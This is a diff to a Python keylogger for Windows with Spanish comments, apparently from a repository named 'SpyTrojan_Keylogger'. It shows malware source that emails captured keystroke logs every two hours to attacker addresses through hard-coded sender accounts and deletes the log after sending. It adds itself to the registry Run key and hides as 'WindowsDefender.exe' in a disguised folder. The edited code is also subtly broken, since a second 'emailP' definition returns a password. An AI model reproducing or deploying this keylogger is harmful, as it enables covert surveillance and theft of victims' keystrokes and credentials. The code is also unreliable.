@@ -283,18 +283,6 @@ def SendLog():
     while (True):
         n = n+1
 
-        # Correo de envío [Principal]      <=> Se enviará 
-        sender_email_P       = "Send123@gmail.com"   # <<== Cambia éste correo
-        sender_password_P    = "contraseña1"          # <<== Contraseña del correo 
-
-        # Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
-        sender_email_S       = "Sendabc@gmail.com"   # <<== Cambia éste correo
-        sender_password_S    = "contraseña2"          # <<== Contraseña del correo 
-
-        # Correo o correos que recibirán el registro de datos `log.txt`
-        receiver_email   = ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"] # MultiCorreo
-      # receiver_email   = ["correo@gmail.com"]  # SingleCorreo
-
         # Enviar cada 2 horas aprox
         for x in range(720):    #720
             time.sleep(10) # *10 
@@ -311,10 +299,10 @@ def SendLog():
             homedir = GetPathOcult()+str(nameFile)+".txt"
             print("Proceso de envío")
 
-            if sendEmail(homedir, sender_email_P, sender_password_P , receiver_email):    # Envía con el primer correo
+            if sendEmail(homedir, emailP(), passP() , ReceiveE()):    # Envía con el primer correo
                 #Si se envíó correctamente, pues elimina el archivo
                 os.remove(homedir)
-            elif sendEmail(homedir, sender_email_S, sender_password_S , receiver_email):  # Envía con el segundo correo 
+            elif sendEmail(homedir, emailS(), emailP() , ReceiveE()):  # Envía con el segundo correo 
                 os.remove(homedir)
         else:   # No hay conexión
             # Seguirá sobreescribiendo el archivo
@@ -326,7 +314,7 @@ def addStartup():  # function =  Iniciar automaticamente
     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'                       # Path del registro
     def verificar():
         try:  # Intenta crear la dirección
-            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')                   # Carpeta especial de verificación de startup
+            os.makedirs('C:\\Users\\Public\\Security\\Microsoft')                   # Carpeta especial de verificación de startup 
             return True # Se creó la carpeta
         except:
             return False# La carpeta ya existe
@@ -340,17 +328,34 @@ def addStartup():  # function =  Iniciar automaticamente
             SetValueEx(registry,name, 0, REG_SZ, path)
     # Personalizar Keylogger
 
+# ************************************************   ZONA CUSTOM   *********************************
 def GetNameKey():                   # Retorna el nombre del Keylogger compilado *.EXE
-    return "WindowsDefender.exe"    
-def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger y el registro de teclas
+    return "WindowsDefender.exe"    # este archivo debe tener el mismo nombre "WindowsDefender.py"  
+def GetPathOcult():                 # Path de la carpeta donde se ocultará el Keylogger y log.txt
     return "C:\\Users\\Public\\Security\\Windows Defender\\"
 def LogName():  # 
     return ".key"
 def FilePath():
     return str(GetPathOcult()+GetPathOcult())
-          
-    
 
+# Correo de envío [Primaria] 
+def emailP():                   # <<== Cambia éste correo
+    return "Send123@gmail.com" 
+def passP():                    # <<== Contraseña del correo
+    return "contraseña1"
+# Correo de envío [Segundaria]     <=> Solo si hay algún problema de envío con el correo Principal
+def emailS():                   # <<== Cambia éste correo
+    return "Sendabc@gmail.com"
+def emailP():                   # <<== Contraseña del correo 
+    return "contraseña2"
+
+#Correos que recibirán los archivos log
+def ReceiveE():
+    #return ["Recibe1@gmail.com", "Recibe2@hotmail.com", "Recibe3@yahoo.com"]   # MultiCorreo
+    return ["Recibe1@gmail.com"]                                                # MonoCorreo
+
+# *********************************************   FIN ZONA CUSTOM   *******************************
+       
 # Inicio multihilo
 if __name__ == '__main__':
     
@@ -371,5 +376,5 @@ if __name__ == '__main__':
 #
 # *** Éste script fue creado solo con fines educativos, por ese detalle el script está documentado, no me hago responsabe por un posible mal uso de éste script***
 #
-# Lea la documentación antes de usar: https://github.com/SebastianEPH/Keylogger_Python
+# Lea la documentación antes de usar: https://github.com/SebastianEPH/SpyTrojan_Keylogger
 
